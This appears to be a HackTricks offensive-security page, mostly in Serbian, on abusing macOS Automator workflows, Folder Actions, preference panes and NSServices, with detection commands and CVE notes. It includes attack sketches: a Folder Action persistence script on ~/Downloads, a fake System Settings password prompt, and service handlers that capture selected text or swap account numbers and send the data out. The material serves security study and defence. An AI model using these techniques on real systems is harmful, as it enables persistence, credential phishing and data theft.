# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Osnovne informacije

**Automator** je macOS alat za vizuelnu automatizaciju. Izvršava **workflows** (`.workflow` bundles) sastavljene od **actions** (`.action` bundles). Automator takođe pokreće **Folder Actions**, **Quick Actions** i integraciju sa **Shortcuts**. Na modernom macOS-u, workflows se mogu i **importovati u Shortcuts**, pa se ista maliciozna logika može pojaviti kao Finder Quick Action, user service u `~/Library/Services/` ili shortcut zasnovan na legacy Automator actions.

Automator actions su **plugins** koje Automator runtime učitava kada se workflow izvrši. One mogu da:
- Izvršavaju proizvoljne shell scripts
- Obrađuju files i data
- Interaguju sa applications pomoću AppleScript-a
- Povezuju se u složene automatizacije

### Zašto je ovo važno

> [!WARNING]
> Automator workflows mogu biti **social-engineered** za izvršavanje — izgledaju kao jednostavni document files. `.workflow` bundle može sadržati ugrađene shell commands koji se izvršavaju kada se workflow pokrene. U kombinaciji sa Folder Actions, oni omogućavaju **automatsku persistence** koja se aktivira pri događajima nad files. Nedavne Gatekeeper ispravke su takođe pokazale da se **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) moraju tretirati kao izvršni sadržaj, a ne kao bezopasni podaci.

### Otkrivanje
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Workflow zasnovan na social engineeringu

`.workflow` bundle većini korisnika izgleda kao obična datoteka dokumenta:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions automatski izvršavaju workflow kada se datoteke dodaju u nadgledanu fasciklu:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions opstaju nakon ponovnog pokretanja i izvršavaju se nečujno. Folder Action na `~/Downloads` znači da **svaka preuzeta datoteka pokreće vaš payload** — uključujući datoteke iz Safari-ja, Chrome-a, AirDrop-a i priloge e-pošte. Takođe imajte na umu da `System Events` može da registruje Folder Actions koje upućuju na skripte izvan podrazumevanih lokacija `~/Library/Scripts/Folder Action Scripts`, zbog čega se isplati pretraživati i nepovezane putanje. Za povezane TCC implikacije pogledajte [TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Osnovne informacije

Preference panes (`.prefPane` bundles) su plugins koje učitava **System Settings** (ranije System Preferences). Oni pružaju konfiguracione UI panels za sistemske ili third-party funkcije. Na starijim sistemima učitavao ih je direktno `System Preferences`; u novijim izdanjima third-party panes obično prosleđuje **legacy loader XPC service** koji pokreće System Settings.

### Zašto je ovo važno

- Preference panes se izvršavaju u **trusted host process-u** koji pokreće System Settings / System Preferences
- Na modernim sistemima taj host može biti **`legacyLoader` XPC service**, tako da je važna granica i dalje **trusted Apple UI process -> učitavanje third-party koda**
- Third-party preference panes nasleđuju **security context host process-a** i poverenje korisnika povezano sa tim UI-jem
- Korisnici instaliraju preference panes tako što ih **dvaput kliknu** — što je pogodno za social engineering
- Nakon instalacije, oni **ostaju prisutni** i učitavaju se svaki put kada System Settings otvori taj panel

### Otkrivanje
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

A malicious preference pane nasleđuje bezbednosni kontekst **pane host-a** (istorijski `System Preferences`, a u novijim verzijama često `legacyLoader` helper koji pokreće `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Napad: Persistence putem instalacije
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Panel sa podešavanjima može da imitira legitimne sistemske UI panele kako bi **phishing-ovao akreditive**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Osnovne informacije

**NSServices** omogućava aplikacijama da pruže funkcionalnost drugim aplikacijama kroz meni **Services** (desni klik → Services). Kada korisnik izabere tekst ili podatke i pozove service, izabrani podaci se **šalju service provideru** na obradu.

Services se deklarišu u `Info.plist` datoteci aplikacije pod ključem `NSServices` i registruju kod pasteboard servera (`pbs`). macOS takođe održava **service cache** i **restriction policy**, koji određuju koji services su vidljivi i da li sandboxed pozivaoci treba da dobiju dodatno upozorenje.

### Zašto je ovo važno

- Services primaju **tok podataka između aplikacija** — izabrani tekst iz bilo koje aplikacije šalje se service-u
- Zlonamerni service može da prikuplja podatke iz password managera, email klijenata i finansijskih aplikacija
- Services mogu da **vrate izmenjene podatke** aplikaciji koja ih poziva (man-in-the-middle pri operacijama nad selekcijom)
- Nazivi services mogu biti napravljeni tako da izgledaju legitimno ("Format Text", "Encrypt Selection", "Share")
- Opciona oznaka `NSRestricted` je bezbednosno relevantna: service označen kao unrestricted može biti pozvan iz sandboxed aplikacije bez upozorenja koje macOS prikazuje za services sklone escape-u<sup>[[2]](#references)</sup>

### Otkrivanje
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Napad: Servis za presretanje podataka
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Napad: Izmena podataka (Man-in-the-Middle)

Servis može da **izmeni vraćene podatke** dok deluje kao da pruža legitimnu funkciju:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Ograničene usluge i moderna zloupotreba

Apple podržava opcionu booleansku vrednost `NSRestricted` za svaku definiciju usluge. Ako je postavljena, macOS upozorava sandboxed pozivaoce jer usluga može da im pomogne da **izađu iz sandbox-a ili zaobiđu granice privatnosti**. Iz ofanzivne perspektive, ovo pruža dva korisna pravca za audit:

- Potražite **third-party services koje nisu označene kao restricted**, iako prosleđuju Apple Events, pristup fajlovima ili druge privilegovane radnje
- Potražite **high-value built-in services** sa snažnim entitlements (na primer, usluge koje izlažu Script Editor ili helper-i zasnovani na Finder-u) i proverite da li je interakcija korisnika dovoljna da ih pretvori u primitive za pristup podacima

Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se zloupotrebi za pristup **TCC-protected korisničkim fajlovima bez očekivanog toka potvrde**. Greška je otklonjena, ali tehnika ostaje korisna za threat modeling: svaka usluga koja prosleđuje zahteve za pristup fajlovima ili automatizaciju u ime pozivaoca zaslužuje isti nivo provere.<sup>[[2]](#references)</sup>

---

## Nedavne bezbednosne napomene

- **Quick Actions su izvršni sadržaj**: Apple je 2024. otklonio Gatekeeper bypass kod kojeg je Automator Quick Action upakovan u aplikaciju mogao da se izvrši bez uobičajene procene. Prilikom audita aplikacija, pregledajte `Contents/PlugIns/*.workflow/Contents/document.wflow` upravo kao što biste pregledali helper scripts ili login items. Pogledajte [stranicu o Gatekeeper-u](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts mogu da naslede legacy Automator ponašanje**: Apple je takođe dodao dodatni prompt za saglasnost korisnika nakon što je utvrđeno da third-party shortcuts koriste **legacy Automator action** za slanje Apple Events bez očekivanog toka dozvola. Uvezene workflows i shortcut bundles treba pregledati u potrazi za `Run AppleScript`, `Run Shell Script` i sličnim bridge actions. Pogledajte [TCC stranicu](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Automator je i dalje aktivna granica privatnosti**: Apple je 2025. objavio još jednu Automator ispravku za pristup zaštićenim korisničkim podacima. Čak i ako je Automator legacy surface, svaki workflow runner, Quick Action host ili automation bridge tretirajte kao aktuelnu attack surface, a ne kao napušteni kod.<sup>[[4]](#references)</sup>

---

## Lanci napada koji kombinuju tehnike

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Okno sa podešavanjima → TCC eskalacija
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Krađa iz Password Manager-a
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Reference

- [1] [Apple — O bezbednosnom sadržaju macOS Ventura 13.7, Sonoma 14.7 i Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Kako je NSServices exploit funkcionisao na macOS-u](https://moonlock.com/nsservices-macos)
- [3] [Apple — O bezbednosnom sadržaju macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple — O bezbednosnom sadržaju macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
